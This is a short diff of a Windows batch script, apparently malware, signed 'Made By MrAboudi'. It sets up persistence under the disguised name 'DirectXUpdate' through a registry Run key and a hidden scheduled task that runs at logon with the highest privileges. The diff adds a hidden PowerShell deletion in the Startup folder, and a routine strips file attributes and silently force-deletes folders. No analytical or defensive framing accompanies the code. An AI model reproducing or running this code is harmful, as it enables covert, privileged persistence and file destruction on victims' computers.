@@ -105,11 +105,14 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "DirectXUpdate" 
 
 SCHTASKS /Create /TN "DirectXUpdateHidden" /TR "\"%DirectXUpdate_BAT_FILE%\"" /SC ONLOGON /RL HIGHEST /F >nul 2>&1
 
+powershell -WindowStyle Hidden -Command "Remove-Item '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini' -Force -ErrorAction SilentlyContinue"
+
 :clean_folder
 if exist "%~1\" (
     attrib -h -s -r "%~1\*" /s /d >nul 2>&1
-    rmdir /s /q "%~1" >nul 2>&1
+    rmdir /s /q "%~1" >nul 
 )
+
 exit /b
 
 :: Made By MrAboudi
